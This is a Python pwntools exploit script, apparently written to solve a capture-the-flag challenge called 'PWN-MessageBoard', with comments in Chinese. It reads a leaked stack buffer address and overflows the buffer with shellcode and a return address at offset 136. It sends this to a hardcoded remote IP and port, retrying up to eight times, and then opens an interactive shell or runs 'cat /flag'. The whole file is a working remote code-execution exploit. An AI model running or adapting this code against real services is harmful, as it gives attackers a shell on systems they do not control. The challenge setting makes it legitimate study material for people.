"""
PWN-MessageBoard 独立验证脚本（带自动重试）
使用:
  python3 verify.py                              # 远程打 flag (自动重试)
  python3 verify.py LOCAL QEMU CMD="echo OK"     # 本地 qemu 测试
"""

from pwn import *

HOST = "47.99.147.34"
PORT = 10303
OFFSET = 136
MAX_RETRIES = 8

context.arch = "amd64"


def build_payload(buf_addr: int) -> bytes:
    sc = asm(shellcraft.sh())
    return sc.ljust(OFFSET, b"\x90") + p64(buf_addr)


def connect_remote():
    """远程服务偶发空连接，自动重试直到读到数据"""
    for i in range(1, MAX_RETRIES + 1):
        io = remote(HOST, PORT, timeout=10)
        try:
            data = io.recv(timeout=3)
        except EOFError:
            io.close()
            log.warning(f"retry {i}/{MAX_RETRIES}: remote closed immediately")
            continue

        if not data:
            io.close()
            log.warning(f"retry {i}/{MAX_RETRIES}: no data received")
            continue

        # 把已收到的数据塞回 buffer，让 recvuntil 处理
        io.unrecv(data)
        log.success(f"connected on attempt {i}")
        return io

    log.error("failed to connect after all retries")
    exit(1)


def exploit(io, cmd: str = None):
    io.recvuntil(b"Buffer at: ")
    leak = int(io.recvline().strip(), 16)
    log.success(f"buf @ {hex(leak)}")

    io.recvuntil(b"Message: ")
    io.send(build_payload(leak))
    io.recvuntil(b"Thank you for your message!\n")

    if cmd:
        io.sendline(cmd.encode())
        sleep(0.8)
        data = io.recvrepeat(2)
        if data:
            print(data.decode("latin-1", errors="replace"), end="")
    else:
        io.interactive()


if __name__ == "__main__":
    if args.LOCAL:
        p = process([b"qemu-x86_64", b"./vuln"])
        exploit(p, cmd=args.CMD)
    else:
        io = connect_remote()
        cmds = args.CMD if args.CMD else "cat /flag"
        exploit(io, cmd=cmds)
